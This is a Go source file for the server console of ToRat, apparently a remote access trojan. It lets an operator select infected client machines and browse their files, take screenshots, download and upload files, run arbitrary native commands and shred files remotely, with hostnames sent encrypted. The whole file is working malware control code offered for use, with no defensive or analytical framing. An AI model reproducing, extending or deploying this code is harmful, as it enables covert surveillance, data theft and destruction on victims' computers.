package server

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/lu4p/shred"

	"github.com/lu4p/ToRat/torat_server/crypto"

	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
	"github.com/lu4p/ToRat/models"
)

var void int

// Shell interactive shell
func Shell() {
	shell := ishell.New()
	cwd, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

	shell.AddCmd(&ishell.Cmd{
		Name: "select",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to interact with")
			client := getClient(choice)
			client.shellClient()
		},
		Help: "interact with a client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			printClients()
		},
		Help: "list all connected clients",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "alias",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				color.HiRed("No clients yet!")
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to give an alias")
			fmt.Println("Type an alias for selected client")
			name := c.ReadLine()
			client := activeClients[choice]
			client.Client.Name = name
			db.Save(&client.Client)
		},
		Help: "give a client an alias",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			os.Chdir(strings.Join(c.Args, " "))
			cwd, err := os.Getwd()
			if err != nil {
				log.Fatalln("Could not change directory:", err)
			}

			shell.SetPrompt(blue(cwd) + "$ ")

		},
		Help: "change the working directory of the server",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			color.HiRed("exiting...")
			c.Stop()
		},
		Help: "exit the server",
	})
	shell.Run()
}

func (client activeClient) shellClient() {
	fileCompleter := func([]string) []string {
		return client.Dir.Files
	}
	shell := ishell.New()
	client.GetWd()

	shell.SetPrompt(blue(client.Dir.Path) + "$ ")
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			client.Cd(c)
			shell.SetPrompt(blue(client.Dir.Path) + "$ ")
		},
		Completer: fileCompleter,
		Help:      "change the working directory of the client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "screen",
		Func: client.Screen,
		Help: "take a screenshot of the client and upload it to the server",
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "down",
		Func:      client.Download,
		Help:      "download a file from the client: usage down <file>",
		Completer: fileCompleter,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "up",
		Func: client.Upload,
		Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "cat",
		Func:      client.Cat,
		Help:      "print the content of a file: usage cat <file>",
		Completer: fileCompleter,
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "escape",
		Func: client.runCommand,
		Help: "escape a command and run it natively on client",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "reconnect",
		Func: func(c *ishell.Context) {
			client.Reconnect(c)
			shell.Close()
		},
		Help: "tell the client to reconnect",
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			c.Stop()
			shell.Close()
		},
		Help: "background the current session",
	})
	shell.NotFound(client.runCommand)
	shell.Run()
}

func (client *activeClient) ls(c *ishell.Context) {
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(red("[!] Encoutered err listing dir", err))
		return
	}
	client.Dir = r
	for _, f := range client.Dir.Files {
		c.Println(f)
	}
}

func (client *activeClient) GetWd() error {
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		client.Dir.Path = "unknown"
		return err
	}
	client.Dir = r
	return nil
}

func (client *activeClient) Shred(c *ishell.Context) {
	args := models.Shred{
		Conf: shred.Conf{
			Times:  3,
			Zeros:  true,
			Remove: true,
		},
		Path: strings.Join(c.Args, " "),
	}
	var r error
	err := client.RPC.Call("API.Shred", &args, &r)
	if err != nil {
		c.Println(red("[!] Could not shred path:", args.Path, err, r))
	}
}

func (client *activeClient) GetHostname() error {
	var encHostname []byte

	err := client.RPC.Call("API.Hostname", void, &encHostname)
	if err != nil {
		return err
	}
	byteHostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		log.Println("EncHostname", encHostname)
		return err
	}
	client.Hostname = string(byteHostname)
	return nil
}

func (client *activeClient) Download(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	filename := strings.Join(c.Args, " ")
	var r models.File
	err := client.RPC.Call("API.SendFile", filename, &r)
	if err != nil {
		c.ProgressBar().Final(red("[!] Download failed:", err))
		c.ProgressBar().Stop()
	}
	path := filepath.Join(client.Client.Path, filename)
	err = ioutil.WriteFile(path, r.Content, 0600)
	if err != nil {
		c.ProgressBar().Final(red("[!] Download failed:", err))
		c.ProgressBar().Stop()
	}
	c.ProgressBar().Final(green("[+] Download received"))
	c.ProgressBar().Stop()

}

func (client *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	info, _ := os.Stat(path)
	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(red("[!] Upload failed could not Read file"))
		c.ProgressBar().Stop()
	}

	f := models.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	var r error
	client.RPC.Call("API.RecvFile", f, &r)
	if r != nil {
		c.ProgressBar().Final(red("[!] Upload failed"))
		c.ProgressBar().Stop()
	}
	c.ProgressBar().Final(green("[+] Upload Successful"))
	c.ProgressBar().Stop()

}

func (client *activeClient) Ping(c *ishell.Context) {
	var r string

	client.RPC.Call("API.Ping", void, &r)
}

func (client *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	err := client.RPC.Call("API.Screen", void, &r)
	if err != nil {
		c.ProgressBar().Final(red("[!] Screenshot failed"))
		c.ProgressBar().Stop()
		return
	}
	err = ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
	if err != nil {
		c.ProgressBar().Final(red("[!] Screenshot failed could not Write file to host"))
		c.ProgressBar().Stop()
		return
	}
	c.ProgressBar().Final(green("[+] Screenshot received"))
	c.ProgressBar().Stop()

}

func (client *activeClient) Reconnect(c *ishell.Context) {
	var r bool

	client.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

func (client *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	client.RPC.Call("API.Cat", path, &r)
	println(r)
}

func (client *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := models.Dir{}
	err := client.RPC.Call("API.Cd", path, &r)
	if err != nil {
		c.Println(red("[!] Could not get cwd", err))
		return
	}
	client.Dir = r
}
